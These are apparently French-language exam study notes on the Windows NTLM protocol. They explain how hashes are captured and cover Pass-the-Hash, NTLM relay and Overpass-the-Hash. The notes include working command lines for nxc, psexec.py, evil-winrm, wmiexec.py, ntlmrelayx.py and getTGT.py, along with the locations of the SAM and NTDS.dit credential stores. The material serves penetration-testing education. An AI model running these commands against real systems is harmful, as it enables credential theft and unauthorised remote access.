# Protocole NTLM

## L'analogie du mot de passe haché

Imagine que pour entrer dans une salle, au lieu de dire ton mot de passe, tu envoies une **empreinte mathématique** de ce mot de passe (un hash). Le serveur compare cette empreinte avec celle qu'il a en stock.

---

## Fonctionnement NTLM : Challenge/Réponse en 3 étapes

```
1. Client  →  Serveur  :  "Je veux me connecter"
2. Serveur →  Client   :  "Ok, voici un défi aléatoire : X7F2A"
3. Client  →  Serveur  :  Hash(mot_de_passe + X7F2A)
```

Le serveur recalcule de son côté et compare. Si c'est identique → accès accordé.

---

## Pourquoi NTLM est dangereux

- Le hash circule sur le réseau → il peut être **capturé**
- Si tu as le hash, tu peux **rejouer l'authentification** sans connaître le mot de passe → c'est le **Pass-the-Hash**
- Si quelqu'un répond à la place du vrai serveur, il récupère le hash → c'est le **Relay Attack**

| Vulnérabilité | Attaque |
|---------------|---------|
| Le hash circule sur le réseau | Capture par Responder |
| Rejouer l'auth sans le mot de passe | **Pass-the-Hash** |
| Relayer vers un autre serveur | **NTLM Relay** |
| Pas de vérification de l'identité du serveur | **MiTM / Relay** |

---

## Les deux types de hashes NTLM : distinction critique pour l'exam

Il existe deux cas bien distincts que beaucoup confondent :

### Cas 1 : NetNTLMv2 : capturé par Responder

Avec Responder, on capture du **NetNTLMv2** (challenge/réponse réseau).

Format capturé :
```
Alice::ENTREPRISE:1122334455667788:AABBCC...:0101000000000000...
```

Ce que tu peux faire avec :

- ✅ **Crack offline** avec hashcat (`-m 5600`)
- ✅ **Relay NTLM** vers une autre machine
- ❌ **PAS utilisable directement en Pass-the-Hash classique**

### Cas 2 : NT Hash : extrait de SAM ou NTDS.dit

Le **vrai** hash NT, stocké dans :

```
C:\Windows\System32\config\SAM   → comptes locaux
C:\Windows\NTDS\NTDS.dit         → comptes de domaine (sur le DC)
```

Format :
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:AABBCCDDEEFF001122...
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^
                  LM hash (obsolète, vide)           NT hash ← celui qu'on veut
```

Ce que tu peux faire avec :

- ✅ **Pass-the-Hash** direct (psexec, nxc, evil-winrm...)
- ✅ **Overpass-the-Hash** (convertir en ticket Kerberos)

```
┌─────────────────────────────────────────────────────────────┐
│ Schéma mental : NE PAS CONFONDRE                            │
│                                                             │
│ Responder capture                                           │
│     ↓                                                       │
│ NetNTLMv2 (réseau)  →  Crack / Relay   ← PAS du PTH direct │
│                                                             │
│ secretsdump / nxc --sam / nxc --ntds                       │
│     ↓                                                       │
│ NT Hash (local/domaine)  →  Pass-the-Hash ✅               │
└─────────────────────────────────────────────────────────────┘
```

!!! warning "Piège classique à l'exam"
    **NTLMv2 ≠ NT hash.**
    Le PTH classique nécessite le NT hash stocké dans SAM ou NTDS.dit, PAS le NetNTLMv2 capturé par Responder.

---

## Pass-the-Hash (PtH)

Tu utilises un **NT hash** directement pour t'authentifier à la place du mot de passe.

```bash
# Avec nxc (spray sur le réseau)
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN

# Avec psexec : shell SYSTEM
psexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET

# Avec evil-winrm : shell WinRM
evil-winrm -i $TARGET -u $USER -H $NT_HASH

# Avec wmiexec : plus discret
wmiexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET
```

!!! tip "Format du hash"
    La partie LM est obsolète. Utilise toujours `:NT_HASH` (les deux-points avant = LM vide).
    Exemple : `-hashes :AABBCCDDEEFF001122`

---

## NTLM Relay Attack

Au lieu de cracker le hash, tu le **relaies en temps réel** vers une autre machine.

**L'analogie :** tu interceptes le badge d'Alice et tu l'utilises immédiatement pour ouvrir une autre porte avant qu'Alice s'en rende compte.

```
Alice → tente de se connecter à \\SERVEUR-INEXISTANT
   ↓
Attaquant (Responder) intercepte l'authentification NTLM
   ↓
Attaquant relaie vers \\SERVEUR-CIBLE
   ↓
\\SERVEUR-CIBLE croit que c'est Alice → accès accordé
```

!!! important "Prérequis"
    Pour que le relay fonctionne, la **signature SMB doit être désactivée** sur la cible.
    C'est souvent le cas sur les postes de travail, rarement sur les DC.

```bash
# Identifier les machines sans signature SMB
nxc smb $RANGE --gen-relay-list targets.txt

# Relay basique
ntlmrelayx.py -tf targets.txt -smb2support

# Relay avec mode SOCKS (pour proxychains)
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

---

## Overpass-the-Hash (OPtH)

Transformer un NT hash en **ticket Kerberos TGT** : utile pour contourner les environnements qui filtrent NTLM.

```bash
getTGT.py -hashes :$NT_HASH $DOMAIN_FQDN/$USER
export KRB5CCNAME=$PWD/$USER.ccache
klist
```

---

## Stockage des credentials Windows

```
[Machine locale]
  └── SAM + SYSTEM   → hashes locaux  → PtH local
  └── LSASS (mémoire) → sessions actives (mdp en clair si WDigest activé)

[Domaine : sur le DC]
  └── NTDS.dit + SYSTEM → tous les hashes AD → PtH domaine
  └── LSA Secrets (LSASS) → comptes de services, scheduled tasks
```
